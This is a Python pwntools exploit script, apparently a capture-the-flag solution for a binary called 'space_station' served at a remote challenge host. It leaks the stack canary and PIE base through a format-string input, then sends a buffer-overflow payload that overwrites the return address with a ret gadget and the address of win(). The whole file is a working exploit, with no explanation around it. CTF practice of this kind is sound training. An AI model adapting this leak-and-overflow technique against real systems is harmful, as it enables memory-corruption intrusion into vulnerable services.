#!/usr/bin/env python3
from pwn import *

exe = ELF('space_station', checksec=False)
context.binary = exe
context.arch = 'amd64'
context.os = 'linux'

CANARY_IDX       = 15
PIE_IDX          = 17
PIE_OFFSET       = 0x139e
GADGET_OFFSET = 0x101a
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote('offsec.m0lecon.it', 13581)

def main():
    r = conn()

    # leak phase
    r.recvuntil(b'astronaut ID: ')
    r.sendline(f'%{CANARY_IDX}$lx.%{PIE_IDX}$lx'.encode())

    leak = r.recvline().strip().split(b'.')
    canary   = int(leak[0], 16)
    pie_base = int(leak[1], 16) - PIE_OFFSET
    exe.address = pie_base

    log.info(f'canary   = {canary:#x}')
    log.info(f'pie_base = {pie_base:#x}')
    log.info(f'win()    = {exe.sym.win:#x}')

    # overflow phase
    r.recvuntil(b'mission log: ')
    payload = flat(
        b'A' * OFFSET_TO_CANARY,
        p64(canary),
        b'B' * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
        p64(exe.address + GADGET_OFFSET),   # ret gadget
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()